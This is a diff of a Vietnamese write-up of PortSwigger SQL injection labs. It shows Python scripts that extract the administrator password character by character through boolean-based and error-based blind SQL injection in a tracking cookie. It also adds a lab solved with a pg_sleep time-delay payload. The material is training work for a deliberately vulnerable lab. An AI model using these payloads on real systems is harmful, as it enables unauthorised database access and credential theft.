@@ -337,7 +337,7 @@ password = ""
 for i in range(1, 21):
     for j in charset:
         cookie = {"TrackingId":f"' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1)='{j}"}
-        
+
         r = requests.get(url, cookies=cookie)
         if "Welcome back!" in r.text:
             password += j
@@ -401,7 +401,7 @@ for i in range(1, 21):
     for j in charset:
         cookie = {"TrackingId": f"' || (SELECT CASE WHEN SUBSTR(password, {i}, 1)='{j}' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') || '"}
         r = requests.get(url, cookies=cookie)
-        
+
         if r.status_code == 200:
             password += j
             break
@@ -433,3 +433,17 @@ Như vậy, chỉ cần đổi `username` thành `password` trong payload là ch
 ![image](images/lab-13/lab-13-2.png)
 
 Cuối cùng, đăng nhập với `administrator:2qrqz8cwynn52caocn38` để giải thành công bài lab.
+
+## Lab 14: [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+>
+> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+>
+> To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.
+
+Bài lab này yêu cầu chúng ta thực hiện khai thác SQL injection để khiến cho response bị trễ 10 giây.
+
+Chúng ta chỉ cần thay đổi giá trị của cookie `TrackingId` thành `' || pg_sleep(10)--` là thành công:
+
+![image](images/lab-14/lab-14.png)
